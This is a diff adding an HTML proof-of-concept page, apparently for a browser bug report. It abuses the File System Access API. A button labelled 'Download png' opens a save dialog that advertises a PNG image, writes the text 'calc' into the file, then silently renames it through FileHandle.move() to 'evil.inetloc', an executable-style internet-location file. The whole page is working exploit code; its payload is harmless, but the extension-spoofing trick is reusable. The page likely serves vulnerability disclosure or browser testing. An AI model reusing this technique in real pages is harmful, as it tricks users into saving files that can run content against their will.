@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test PoC for FileHandle.move()</title>
+</head>
+<body>
+    <button id="runButton">Download png</button>
+    <pre id="log"></pre>
+
+    <script>
+        // Fungsi untuk mencatat output ke layar
+        const log = (message) => {
+            console.log(message);
+            document.getElementById("log").textContent += message + "\n";
+        };
+
+        document.getElementById("runButton").onclick = async () => {
+            try {
+                // 1. Memanggil showSaveFilePicker()
+                const fileHandle = await window.showSaveFilePicker({
+                    suggestedName: `hello`,
+                    startIn: "desktop",
+                    // Prompt nama file yang terlihat oleh pengguna (ImageFile)
+                    types: [{
+                        description: [`ImageFile`],
+                        accept: {
+                            'image/png': ['.png']
+                        },
+                    }, ],
+                });
+
+
+                // 2. Mendapatkan FileSystemWritableFileStream
+                const writableStream = await fileHandle.createWritable();
+
+
+                // 3. Menulis konten (payload) dan menutup stream
+                await writableStream.write(new TextEncoder().encode(`calc`));
+                await writableStream.close();
+                await fileHandle.move("evil.inetloc");
+
+            } catch (error) {
+
+            }
+        };
+    </script>
+
+</body>
+</html>
